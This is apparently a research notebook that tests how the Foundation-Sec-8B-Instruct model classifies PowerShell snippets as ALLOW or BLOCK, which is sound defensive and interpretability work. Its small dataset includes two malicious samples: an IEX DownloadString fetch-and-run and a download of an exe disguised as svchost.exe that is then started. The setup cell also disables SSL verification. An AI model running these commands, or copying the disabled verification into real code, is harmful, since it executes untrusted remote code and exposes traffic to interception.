# Circuit Validation Experiments - Simple Version
## PowerShell Classification - Foundation-Sec-8B-Instruct

**NOTE**: This simplified version has SSL error handling built in.

If you get SSL errors, see: `SSL_FIX_GUIDE.md`

## Setup

In [ ]:
import os
import re
import random
import numpy as np
import pandas as pd
import torch
from typing import List, Dict, Tuple

# Fix SSL issues FIRST, before any network operations
import ssl
import urllib3
try:
    ssl._create_default_https_context = ssl._create_unverified_context
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    print("✓ SSL verification disabled for this session")
except:
    print("⚠ Could not disable SSL verification")

torch.set_grad_enabled(False)

SEED = 42
random.seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)

DEVICE = "cuda" if torch.cuda.is_available() else "cpu"
DTYPE = torch.bfloat16 if (torch.cuda.is_available() and torch.cuda.is_bf16_supported()) else torch.float16

print(f"DEVICE: {DEVICE}, DTYPE: {DTYPE}")

In [ ]:
from transformers import AutoTokenizer, AutoModelForCausalLM
from transformer_lens import HookedTransformer

HF_REPO = "fdtn-ai/Foundation-Sec-8B-Instruct"

print("Loading tokenizer...")
try:
    # Try loading from local cache first
    tokenizer = AutoTokenizer.from_pretrained(
        HF_REPO,
        use_fast=True,
        trust_remote_code=True,
        local_files_only=True
    )
    print("✓ Tokenizer loaded from local cache")
except Exception as e:
    print(f"⚠ Local load failed: {str(e)[:80]}...")
    print("  Trying online...")
    tokenizer = AutoTokenizer.from_pretrained(
        HF_REPO,
        use_fast=True,
        trust_remote_code=True,
        local_files_only=False
    )
    print("✓ Tokenizer loaded from Hugging Face")

tokenizer.padding_side = "left"
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token

print("\nLoading model (this may take a few minutes)...")
try:
    # Try loading from local cache first
    hf_model = AutoModelForCausalLM.from_pretrained(
        HF_REPO,
        dtype=DTYPE,
        device_map="auto" if DEVICE == "cuda" else None,
        low_cpu_mem_usage=True,
        trust_remote_code=True,
        local_files_only=True
    )
    print("✓ Model loaded from local cache")
except Exception as e:
    print(f"⚠ Local load failed: {str(e)[:80]}...")
    print("  Trying online...")
    hf_model = AutoModelForCausalLM.from_pretrained(
        HF_REPO,
        dtype=DTYPE,
        device_map="auto" if DEVICE == "cuda" else None,
        low_cpu_mem_usage=True,
        trust_remote_code=True,
        local_files_only=False
    )
    print("✓ Model loaded from Hugging Face")

hf_model.eval()

print("\nWrapping with TransformerLens...")
TL_TEMPLATE_NAME = "meta-llama/Llama-3.1-8B-Instruct"
model = HookedTransformer.from_pretrained(
    TL_TEMPLATE_NAME,
    hf_model=hf_model,
    tokenizer=tokenizer,
    device=DEVICE,
    dtype=DTYPE,
    fold_ln=False,
    center_unembed=False,
    center_writing_weights=False,
)
model.eval()

print(f"✓ Model ready: {model.cfg.n_layers} layers, {model.cfg.n_heads} heads")

## Setup: Labels and Dataset

In [ ]:
# Label tokens
LABEL_TOK_ALLOW = tokenizer.encode(" ALLOW", add_special_tokens=False)[0]
LABEL_TOK_BLOCK = tokenizer.encode(" BLOCK", add_special_tokens=False)[0]

print(f"Label tokens: ALLOW={LABEL_TOK_ALLOW}, BLOCK={LABEL_TOK_BLOCK}")

def make_prompt(ps_script: str) -> str:
    return (
        "You are a security classifier. Label the given PowerShell as:\n"
        "ALLOW = benign / administrative / normal usage\n"
        "BLOCK = malicious (downloading, execution, evasion, credential theft, etc.)\n\n"
        "Return ONLY one word: ALLOW or BLOCK.\n\n"
        "PowerShell:\n"
        "```powershell\n"
        f"{ps_script}\n"
        "```\n"
        "Answer:"
    )

# Dataset
DATA = [
    {"label": 0, "name": "List services", "ps": r"Get-Service | Sort-Object Status, Name | Select-Object -First 10"},
    {"label": 0, "name": "Check disk space", "ps": r"Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free"},
    {"label": 0, "name": "List processes", "ps": r"Get-Process | Where-Object {$_.CPU -gt 50}"},
    {"label": 1, "name": "DownloadString + IEX", "ps": r"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"},
    {"label": 1, "name": "WebRequest to temp", "ps": r"Invoke-WebRequest -Uri 'http://example.com/a.exe' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe"},
]

df = pd.DataFrame(DATA)
print(f"\nDataset: {len(df)} examples ({(df['label']==0).sum()} benign, {(df['label']==1).sum()} malicious)")
print(df[["label", "name"]])

## Helper Functions

In [ ]:
def logit_diff_from_logits(logits: torch.Tensor) -> float:
    """Extract logit diff: BLOCK - ALLOW"""
    nxt = logits[0, -1]
    return float((nxt[LABEL_TOK_BLOCK] - nxt[LABEL_TOK_ALLOW]).item())

def classify(prompt: str) -> Tuple[float, str]:
    """Classify a PowerShell prompt"""
    toks = model.to_tokens(prompt)
    logits = model(toks, return_type="logits")
    ld = logit_diff_from_logits(logits)
    pred = "BLOCK" if ld > 0 else "ALLOW"
    return ld, pred

print("Helper functions ready")

## Baseline: All Examples

In [ ]:
print("\n" + "="*80)
print("BASELINE: Classification on all examples")
print("="*80)

prompts = [make_prompt(ps) for ps in df["ps"]]
logit_diffs = []
predictions = []

for i, prompt in enumerate(prompts):
    ld, pred = classify(prompt)
    logit_diffs.append(ld)
    predictions.append(pred)
    print(f"  {i+1}/{len(prompts)}: {df.loc[i, 'name']:30s} → {pred:6s} (ld={ld:7.4f})")

df_results = df.copy()
df_results["logit_diff"] = logit_diffs
df_results["prediction"] = predictions
df_results["correct"] = (df_results["label"] == 0) == (df_results["prediction"] == "ALLOW")

accuracy = df_results["correct"].mean()
print(f"\nAccuracy: {accuracy:.1%} ({df_results['correct'].sum()}/{len(df_results)})")

## Summary & Quick Analysis

In [ ]:
print("\n" + "="*80)
print("BASELINE SUMMARY")
print("="*80)

print("\nBenign examples:")
benign = df_results[df_results["label"] == 0]
print(benign[["name", "logit_diff", "prediction", "correct"]].to_string(index=False))
print(f"Average logit diff: {benign['logit_diff'].mean():.4f}")

print("\nMalicious examples:")
malicious = df_results[df_results["label"] == 1]
print(malicious[["name", "logit_diff", "prediction", "correct"]].to_string(index=False))
print(f"Average logit diff: {malicious['logit_diff'].mean():.4f}")

print("\nKey finding:")
separation = malicious['logit_diff'].mean() - benign['logit_diff'].mean()
print(f"  Separation between classes: {separation:.4f}")
print(f"  Model confidence: {accuracy:.1%}")

## Save Results

In [ ]:
os.makedirs("circuit_validation_results", exist_ok=True)
df_results.to_csv("circuit_validation_results/baseline_simple.csv", index=False)
print(f"Results saved to: circuit_validation_results/baseline_simple.csv")
print(f"\nYou can now extend this notebook to run the 5 validation experiments.")
print(f"See: VALIDATION_EXPERIMENTS_README.md")